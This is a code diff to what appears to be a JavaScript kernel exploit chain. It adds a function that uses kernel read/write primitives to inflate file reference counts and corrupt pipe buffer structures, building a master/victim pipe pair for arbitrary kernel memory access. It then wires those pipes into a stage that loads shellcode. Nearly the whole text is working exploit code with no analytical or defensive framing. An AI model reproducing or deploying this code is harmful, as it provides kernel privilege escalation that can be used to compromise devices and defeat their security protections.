@@ -1729,6 +1729,57 @@
 
         }
 
+        async function prepare_kexp_pipes(S) {
+            const [mr, mw] = create_pipe();
+            const [vr, vw] = create_pipe();
+            const master_pipe = [Number(mr), Number(mw)];
+            const victim_pipe = [Number(vr), Number(vw)];
+
+            for (const fd of master_pipe.concat(victim_pipe)) {
+                syscall(SYSCALL.fcntl, BigInt(fd), F_SETFL, O_NONBLOCK);
+            }
+
+            const get_fp = (fd) => {
+                const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
+                if (fp === 0n || (fp >> 48n) !== 0xFFFFn)
+                    throw new Error("kexp pipe bad fp for fd " + fd);
+                return fp;
+            };
+            const get_fdata = (fd) => {
+                const fdata = S.kread64(get_fp(fd));
+                if (fdata === 0n || (fdata >> 48n) !== 0xFFFFn)
+                    throw new Error("kexp pipe bad f_data for fd " + fd);
+                return fdata;
+            };
+            const bump_file_ref = (fd, delta) => {
+                const fp = get_fp(fd);
+                const rc = S.kread32(fp + 0x28n);
+                if (rc <= 0n || rc >= 0x10000n)
+                    throw new Error("kexp pipe bad f_count for fd " + fd + ": " + toHex(rc));
+                S.kwrite32(fp + 0x28n, rc + BigInt(delta));
+            };
+
+            const master_rpipe_data = get_fdata(master_pipe[0]);
+            const victim_rpipe_data = get_fdata(victim_pipe[0]);
+            for (const fd of master_pipe.concat(victim_pipe)) bump_file_ref(fd, 0x100);
+
+            S.kwrite32(master_rpipe_data + 0x00n, 0n);
+            S.kwrite32(master_rpipe_data + 0x04n, 0n);
+            S.kwrite32(master_rpipe_data + 0x08n, 0n);
+            S.kwrite32(master_rpipe_data + 0x0Cn, BigInt(PAGE_SIZE));
+            S.kwrite64(master_rpipe_data + 0x10n, victim_rpipe_data);
+
+            S.kexp_pipes = { master_pipe, victim_pipe, master_rpipe_data, victim_rpipe_data };
+            await ulog("stage_elfldr: prepared dedicated kexp pipes master=" +
+                master_pipe[0] + "," + master_pipe[1] + " victim=" +
+                victim_pipe[0] + "," + victim_pipe[1]);
+
+            return {
+                master_pipe: [BigInt(master_pipe[0]), BigInt(master_pipe[1])],
+                victim_pipe: [BigInt(victim_pipe[0]), BigInt(victim_pipe[1])],
+            };
+        }
+
         async function stage_load_elf(S) {
 
             await ulog("stage_elfldr: entered");
@@ -1771,12 +1822,13 @@
                         "(syscalls + dlsym unrestricted)");
 
                     const allproc = S.data_base + S.OFF.DATA_BASE_ALLPROC;
-                    const master_pipe = [BigInt(S.master_rfd), BigInt(S.master_wfd)];
-                    const victim_pipe = [BigInt(S.victim_rfd), BigInt(S.victim_wfd)];
+                    const kexp_pipes = await prepare_kexp_pipes(S);
+                    const master_pipe = kexp_pipes.master_pipe;
+                    const victim_pipe = kexp_pipes.victim_pipe;
                     await ulog("stage_elfldr: handoff -> load_aioshellcode " +
                         "(allproc=" + toHex(allproc) +
-                        " master=" + S.master_rfd + "," + S.master_wfd +
-                        " victim=" + S.victim_rfd + "," + S.victim_wfd + ")");
+                        " master=" + master_pipe[0] + "," + master_pipe[1] +
+                        " victim=" + victim_pipe[0] + "," + victim_pipe[1] + ")");
 
                     await load_aioshellcode(allproc, master_pipe, victim_pipe);
 
